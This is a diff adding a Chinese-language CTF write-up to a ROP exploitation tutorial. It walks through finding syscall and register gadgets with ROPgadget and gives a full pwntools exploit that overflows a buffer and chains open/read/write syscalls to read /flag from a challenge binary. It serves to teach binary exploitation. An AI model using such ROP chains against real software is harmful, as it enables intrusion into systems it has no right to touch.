@@ -970,6 +970,90 @@ io.interactive()
       ROPgadget --binary <filename> --opcode cd80c3
       ```
 
+### `CTFDemo-syscall_orw`
+
+> 二进制文件：[syscall_orw](./2_解析ROP（返回导向编程）.assets/ret2syscall)
+
+#### 思路：
+
+此题没有给出动态链接库`libc`的版本，因此只能从这个`ELF`二进制可执行文件中寻找可用的`gadget`：
+先看有没有系统调用：`ROPgadget --binary /challenge/1-3-3 --only "syscall"`：![<syscall>gadgets](./2_解析ROP（返回导向编程）.assets/ret2syscall-<syscall>gadgets.png)
+有，那就可以通过执行系统调用相关函数来拿`flag`；
+
+执行系统调用需要几个关键的寄存器：
+
+- `rax`
+- `rdi`
+- `rsi`
+- `rdx`
+
+看看有没有与这几个寄存器相关的`gadget`：`ROPgadget --binary /challenge/1-3-3 --only "pop|ret" | grep <Reg>`：![<reg>gadgets](./2_解析ROP（返回导向编程）.assets/ret2syscall-<reg>gadgets.png)
+
+OK，那就可以使用`ret2syscall`解题了。
+
+#### wp:
+
+```python
+from pwn import * 
+local_file  = '/challenge/1-3-3'
+select = 0
+if select == 0:
+    r = process(local_file)
+    #process(['./ld-2.23.so','./pwn'], env = {'LD_PRELOAD' : './libc-2.31.so'})
+elif select == 1:
+    r = remote('node4.buuoj.cn',25904 )
+    libc = ELF(remote_libc)
+elf = ELF(local_file)
+context.log_level = 'debug'
+context.arch = elf.arch
+
+se      = lambda data               :r.send(data) 
+sa      = lambda delim,data         :r.sendafter(delim, data)
+sl      = lambda data               :r.sendline(data)
+sla     = lambda delim,data         :r.sendlineafter(delim, data)
+sea     = lambda delim,data         :r.sendafter(delim, data)
+rc      = lambda numb=4096          :r.recv(numb)
+rl      = lambda                    :r.recvline()
+ru      = lambda delims 			:r.recvuntil(delims)
+uu32    = lambda data               :u32(data.ljust(4, b'\0'))
+uu64    = lambda data               :u64(data.ljust(8, b'\0'))
+info    = lambda tag, addr        :r.info(tag + ': {:#x}'.format(addr))
+#------------------------
+def debug(cmd=''):
+     gdb.attach(r,cmd)
+     pause()
+#------------------------
+syscall_ret=0x4026b6
+pop_rax_ret=0x402697
+pop_rdi_ret =0x4026c6
+pop_rsi_ret=0x4026ae
+pop_rdx_ret=0x4026a7
+
+flag_addr=0x0405078
+# payload=flat("a"*0x68,pop_rdi_ret,elf.got['puts'],elf.sym['puts'],elf.sym["_start"])
+# se(payload)
+# libc_base=uu64(ru('\x7f')[-6:])-0x84420
+# info("libc_base",libc_base)
+# payload2=flat("a"*0x68,ret,pop_rdi_ret,libc_base+0x1b45bd,libc_base+0x52290)
+# se(payload2)
+# se(b"./flag\x00\x00\x00")
+# se(flat("a"*0x68,ret,pop_rdi_ret,libc_base+0x1b45bd,libc_base+0x52290))
+
+payload2=flat("a"*0x68, pop_rdi_ret,0, pop_rsi_ret,flag_addr, pop_rdx_ret,0x8, pop_rax_ret,0, syscall_ret,elf.sym['_start'])
+se(payload2)
+se(b"/flag\x00\x00\x00")
+
+orw =flat(pop_rdi_ret,flag_addr, pop_rsi_ret,0, pop_rax_ret,2, syscall_ret)
+orw+=flat(pop_rdi_ret,3, pop_rsi_ret,flag_addr, pop_rdx_ret,0x50, pop_rax_ret,0, syscall_ret)
+orw+=flat(pop_rdi_ret,1, pop_rsi_ret,flag_addr, pop_rdx_ret,0x50, pop_rax_ret,1, syscall_ret)
+payload3=flat("a"*0x68,orw)
+se(payload3)
+#debug()
+r.interactive()
+```
+
+
+
 ### **<u>==`ret2csu`==</u>**
 
 - ##### 		这种攻击手段其实是为我们通过Rop找可用的gadget提供了另外一种途径，很多教程中把它归结为一种单独的攻击方式，但其实这种攻击方式类似于组合拳中的一招一式，是可以和其他攻击手段结合在一起使用的！！！
